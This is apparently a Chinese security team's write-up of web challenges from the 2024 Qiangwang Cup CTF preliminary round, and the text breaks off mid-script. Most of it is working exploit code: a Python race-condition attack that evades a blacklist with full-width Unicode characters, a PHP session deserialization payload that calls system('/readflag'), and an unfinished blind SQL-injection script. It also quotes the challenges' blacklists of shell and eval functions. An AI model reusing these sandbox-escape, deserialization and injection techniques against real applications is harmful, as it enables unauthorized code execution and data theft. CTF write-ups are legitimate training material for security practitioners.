---
title: 2024年第八届强网杯初赛 WP
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247508682&idx=1&sn=4f88b80575e88d41679dec1afb63665b&chksm=fa527774cd25fe6286bf87e34f75a37cdf4dd355d5cafe3c49f9b88cac49805df3bdfd51e651&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-11-07
fetch_date: 2025-10-06T19:19:05.399348
---

# 2024年第八届强网杯初赛 WP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnR86XpTeltDmU6TbKakAHk0x0Vw99Rfbjjc7ibIiaqhhGnpTVRP6uM4n5gsLLZAMDanITxVrXXGG1uw/0?wx_fmt=jpeg)

# 2024年第八届强网杯初赛 WP

原创

NEURON

山石网科安全技术研究院

# WEB

## PyBlockly

在unicode库里面的`_get_repl_str`函数，用于音译转换，可以将中文的符号转为英文符号，利用此处可以绕过`blacklist_pattern`

```
def _get_repl_str(char: str) -> Optional[str]:
    codepoint = ord(char)

    if codepoint < 0x80:
        # Already ASCII
        return str(char)

    if codepoint > 0xeffff:
        # No data on characters in Private Use Area and above.
        return None

    if 0xd800 <= codepoint <= 0xdfff:
        warnings.warn(  "Surrogate character %r will be ignored. "
                        "You might be using a narrow Python build." % (char,),
                        RuntimeWarning, 2)

    section = codepoint >> 8   # Chop off the last two hex digits
    position = codepoint % 256 # Last two hex digits

    try:
        table = Cache[section]
    except KeyError:
        try:
            mod = __import__('unidecode.x%03x'%(section), globals(), locals(), ['data'])
        except ImportError:
            # No data on this character
            Cache[section] = None
            return None

        Cache[section] = table = mod.data

    if table and len(table) > position:
        return table[position]
    else:
        return None
```

除了符号的过滤还有个hook，代码如下：

```
def my_audit_hook(event_name, arg):
    blacklist = ["popen", "input", "eval", "exec", "compile", "memoryview"]
    if len(event_name) > 4:
        raise RuntimeError("Too Long!")
    for bad in blacklist:
        if bad in event_name:
            raise RuntimeError("No!")

__import__('sys').addaudithook(my_audit_hook)
```

这是插入在输入代码之前的内容。关键运行代码如下：

```
code = hook_code + source_code
    tree = compile(source_code, "run.py", 'exec', flags=ast.PyCF_ONLY_AST)
    try:
        if verify_secure(tree):
            with open("run.py", 'w') as f:
                f.write(code)
            result = subprocess.run(['python', 'run.py'], stdout=subprocess.PIPE, timeout=5).stdout.decode("utf-8")
            os.remove('run.py')
            return result
        else:
            return "Execution aborted due to security concerns."
    except:
        os.remove('run.py')
        return "Timeout!"
```

run.py存在条件竞争，写入run.py后镜像执行就行，最终exp：

```
import json
import threading

import requests

url = "http://eci-2ze8g9ev1y12f7v426d9.cloudeci1.ichunqiu.com:5000/blockly_json"

def get_str(s):
    return f'b’‘。fromhex（’{s.encode().hex()}‘）。decode（）'
def test(b):
    a = '''print(__import__('os').popen('/bin/dd if=/flag').read())'''
    payload = (f"""
while True:
    with open({get_str('run.py')}, 'w') as f:
        f.write({get_str(a)})
    """)

    payload = payload.replace("(", "（").replace(")", "）").replace(".", "。").replace(":", "：").replace(",", "，").replace(
        "_", "\u02cd").replace("'", "’")
    #
    if b == True:
        payload = ""
    print("p:"+payload)
    text_block = {"type": "text", 'fields': {'TEXT': f'’\n{payload}\n‘'}}
    payloads = {"blocks": {"blocks": [text_block]}}
    blockly_data = json.dumps(payloads).encode()
    while True:
        r = requests.post(url, data=blockly_data).text
        if r.strip() != "" and not 'Error generating Python code' in r and not 'Timeout' in r:
            print(r)

threading.Thread(target=test, args=(False,)).start()
threading.Thread(target=test, args=(False,)).start()
threading.Thread(target=test, args=(True,)).start()
threading.Thread(target=test, args=(True,)).start()
test(True)
```

找suid有dd命令，然后直接/bin/dd if=/flag读取即可

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR86XpTeltDmU6TbKakAHk0ibcbwLMicI3uSCECSkMtWicuImsBOHwViciahvZniaeykpOPo2Zjsic1xG1ibg/640?wx_fmt=png&from=appmsg)

## platform

扫描发现 www.zip 关键代码在class.php

```
<?php
class notouchitsclass {
    public $data;

    public function __construct($data) {
        $this->data = $data;
    }

    public function __destruct() {
        eval($this->data);
    }
}

class SessionRandom {

    public function generateRandomString() {
    $length = rand(1, 50);

    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }

    return $randomString;
    }

}

class SessionManager {
    private $sessionPath;
    private $sessionId;
    private $sensitiveFunctions = ['system', 'eval', 'exec', 'passthru', 'shell_exec', 'popen', 'proc_open'];

    public function __construct() {
        if (session_status() == PHP_SESSION_NONE) {
            throw new Exception("Session has not been started. Please start a session before using this class.");
        }
        $this->sessionPath = session_save_path();
        $this->sessionId = session_id();
    }

    private function getSessionFilePath() {
        return $this->sessionPath . "/sess_" . $this->sessionId;
    }

    public function filterSensitiveFunctions() {
        $sessionFile = $this->getSessionFilePath();

        if (file_exists($sessionFile)) {
            $sessionData = file_get_contents($sessionFile);

            foreach ($this->sensitiveFunctions as $function) {
                if (strpos($sessionData, $function) !== false) {
                    $sessionData = str_replace($function, '', $sessionData);
                }
            }
            file_put_contents($sessionFile, $sessionData);

            return "Sensitive functions have been filtered from the session file.";
        } else {
            return "Session file not found.";
        }
    }
}
```

index.php如下：

```
<?php
session_start();
require 'user.php';
require 'class.php';

$sessionManager = new SessionManager();
$SessionRandom = new SessionRandom();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $_SESSION['user'] = $username;

    if (!isset($_SESSION['session_key'])) {
        $_SESSION['session_key'] =$SessionRandom -> generateRandomString();
    }
    $_SESSION['password'] = $password;
    $result = $sessionManager->filterSensitiveFunctions();
    header('Location: dashboard.php');
    exit();
} else {
    require 'login.php';
}
```

很明显的字符串长度变动反序列化，再碰撞一下session\_key的长度就行，直接写exp：

```
import threading
import requests

url = "http://eci-2zebvccqe8no8gqeuwr6.cloudeci1.ichunqiu.com/index.php"

def login():
    sess = requests.session()
    while True:
        data = {"username": "eval" * 15, "password": ''';password|O:15:"notouchitsclass":1:{s:4:"data";s:20:"syssystemtem('/readflag');";}'''}
        sess.post(url, data=data)
        r = sess.post(url, data=data).text
        if not '密码:' in r:
            print(r)

threading.Thread(target=login).start()
threading.Thread(target=login).start()
threading.Thread(target=login).start()
threading.Thread(target=login).start()
threading.Thread(target=login).start()
threading.Thread(target=login).start()
login()
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnR86XpTeltDmU6TbKakAHk0UzQSnGTvNz98YBTTFzRsSnicX0NWYicd6VVic8snv0y6x6umjiaEPNfU1w/640?wx_fmt=png&from=appmsg)

## xiaohuanxiong

### 疑似正解思路

gitee找到源码，貌似安装部分被改过改成固定的账号密码和salt，正解步骤可能如下：

application/service/BookService.php 的search方法存在sql注入

```
    public function search($keyword){
        return Db::query(
            "select * from ".$this->prefix."book where match(book_name,summary)
            against ('".$keyword."' IN NATURAL LANGUAGE MODE)"
        );
    }
```

手动注册一个普通用户，跑出来密码，用下面的exp：

```
import requests as requests
url = "http://8.147.129.74:34820/"

def sqli(data):
    data = {"keyword": f"123123'|(exp(44-{data}))|'"}
    fh = requests.get(f"{url}search", params=data, allow_redirects=False).text
    if not "V5.1.35 LTS" in fh:
        return True
    return False
# 注入点，返回条件是否成立

def sqli1(sql):
    ans = ''
    for i in range(1, 1000):
        low = 32
        high = 128
        mid = (low + high) ...